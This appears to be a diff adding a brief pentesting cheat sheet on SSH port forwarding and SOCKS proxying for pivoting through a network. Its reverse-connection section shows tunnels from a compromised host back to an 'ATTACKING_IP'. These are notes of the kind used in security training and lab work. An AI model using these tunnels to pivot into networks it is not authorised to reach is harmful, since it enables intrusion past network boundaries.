@@ -1,0 +1,19 @@
+#Forward Connections
+
+  #Port Forwarding
+  ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@SSH_ACCESS_IP -fN
+  #I can access TARGET_IP:TARGET_PORT through SSH_ACCESS_IP (machine for which I have ssh access which can also connect to TARGET_IP).
+  #I forward traffic of SSH_ACCESS_IP to my localmachine in my LOCAL_PORT, so I can access LOCAL_PORT:TARGET_PORT through my localmachine.
+
+  Proxy 
+  ssh -D LOCAL_PORT USERNAME@SSH_ACCESS_IP -fN
+  #I use LOCAL_PORT as a proxy to send and receive traffic though SSH_ACCESS_IP (machine for which I have ssh access which can also connect #to the rest of the target network)
+
+#Reverse Connections
+
+   #Port Forwarding
+   ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+   #if i have a shell on SSH_ACCESS_IP I use this command to give my attacking machine (ATTACKING_IP) access to the webserver on TARGET_IP.
+
+   #Proxy
+   ssh -R LOCAL_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
